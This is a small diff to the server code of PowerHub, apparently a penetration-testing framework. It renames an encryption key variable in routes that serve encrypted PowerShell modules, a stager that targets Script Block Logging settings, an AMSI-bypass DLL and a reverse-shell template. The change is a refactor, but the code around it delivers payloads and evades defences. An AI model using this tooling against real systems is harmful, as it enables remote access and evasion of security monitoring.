@@ -22,7 +22,7 @@ from powerhub.stager import modules, stager_str, callback_url, \
         import_modules, webdav_url
 from powerhub.upload import save_file, get_filelist
 from powerhub.directories import UPLOAD_DIR, BASE_DIR, XDG_DATA_HOME
-from powerhub.tools import encrypt, compress, key
+from powerhub.tools import encrypt, compress, KEY
 from powerhub.auth import requires_auth
 from powerhub.repos import repositories, install_repo
 from powerhub.obfuscation import symbol_name
@@ -235,9 +235,9 @@ def payload_m():
     if n < len(modules):
         modules[n].activate()
         if 'c' in request.args:
-            resp = b64encode(encrypt(compress(modules[n].code), key)),
+            resp = b64encode(encrypt(compress(modules[n].code), KEY)),
         else:
-            resp = b64encode(encrypt(modules[n].code, key)),
+            resp = b64encode(encrypt(modules[n].code, KEY)),
         return Response(
             resp,
             content_type='text/plain; charset=utf-8'
@@ -257,12 +257,12 @@ def payload_0():
         "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
         "EnableScriptBlockLogging",
     ]
-    encrypted_strings = [b64encode(encrypt(x.encode(), key)).decode() for x
+    encrypted_strings = [b64encode(encrypt(x.encode(), KEY)).decode() for x
                          in encrypted_strings]
     context = {
         "modules": modules,
         "callback_url": callback_url,
-        "key": key,
+        "key": KEY,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
         "stage2": 'r' if 'r' in request.args else '1',
@@ -287,7 +287,7 @@ def payload_1():
                     "payload.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(result, key))
+    result = b64encode(encrypt(result, KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
@@ -299,7 +299,7 @@ def payload_l():
     filename = os.path.join(BASE_DIR, 'binary', 'amsi.dll')
     with open(filename, 'rb') as f:
         DLL = f.read()
-    DLL = b64encode(encrypt(b64encode(DLL), key))
+    DLL = b64encode(encrypt(b64encode(DLL), KEY))
     return Response(DLL, content_type='text/plain; charset=utf-8')
 
 
@@ -390,13 +390,13 @@ def reverse_shell():
         "delay": 10,  # delay in seconds
         "lifetime": 3,  # lifetime in days
         "PORT": str(args.REC_PORT),
-        "key": key,
+        "key": KEY,
     }
     result = render_template(
                     "reverse-shell.ps1",
                     **context,
     ).encode()
-    result = b64encode(encrypt(result, key))
+    result = b64encode(encrypt(result, KEY))
     return Response(result, content_type='text/plain; charset=utf-8')
 
 
